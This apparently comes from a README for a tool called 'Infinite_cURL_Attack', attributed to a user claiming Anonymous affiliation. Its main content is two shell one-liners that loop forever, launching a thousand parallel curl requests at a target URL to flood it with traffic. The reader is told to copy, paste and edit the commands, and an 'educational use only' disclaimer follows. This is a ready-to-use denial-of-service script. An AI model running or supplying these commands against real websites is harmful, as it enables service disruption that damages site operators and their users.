<img src="https://i.pinimg.com/originals/23/a1/1f/23a11f14ab93d3ed4541960141e380ad.gif" width="200" alt="Security Tools by gh0$t. Affiliation : Anonymous (hacker group, global)." title="Security Tools by gh0$t. Affiliation : Anonymous (hacker group, global)." />  

# Infinite_cURL_Attack
Infinite cURL Attack

**USAGE** : Copy-Paste-Edit the following code in the Terminal/CMD.
```
while (true); do xargs -I % -P 1000 curl -v --header "Connection: keep-alive" "https://www.google.com" \ < <(printf '%s\n' {1..1000}); done;
```
OR
```
while (true); do seq 1 1000 | xargs -n1 -P 1000 curl -I -v --header "Connection: keep-alive" "https://www.google.com"; done;
```

**IMPORTANT:**  
THIS SOFTWARE IS PROVIDED FOR EDUCATIONAL USE ONLY!  
IF YOU ENGAGE IN ANY ILLEGAL ACTIVITY THE AUTHOR DOES NOT TAKE ANY RESPONSIBILITY FOR IT.  
BY USING THIS SOFTWARE YOU AGREE WITH THESE TERMS.
